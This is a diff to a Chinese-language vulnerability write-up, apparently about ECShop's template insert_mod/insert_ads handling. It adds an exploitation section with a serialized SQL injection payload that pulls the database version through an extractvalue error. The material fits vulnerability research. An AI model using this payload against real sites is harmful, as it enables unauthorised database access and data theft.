@@ -35,6 +35,7 @@ foreach ($k AS $key => $val)
             $out = implode('', $k);
 ···
 ```
+```
 cls_template.php
 function insert_mod($name) // 处理动态内容
     {
@@ -45,3 +46,13 @@ function insert_mod($name) // 处理动态内容
         return $fun($para);
     }
 ```
+
+### 利用
+
+```
+554fcae493e564ee0dc75bdf2ebf94caads为$_echash给定值
+554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
+$arr['id']带入function insert_ads($arr)中导致SQli
+```
+
+
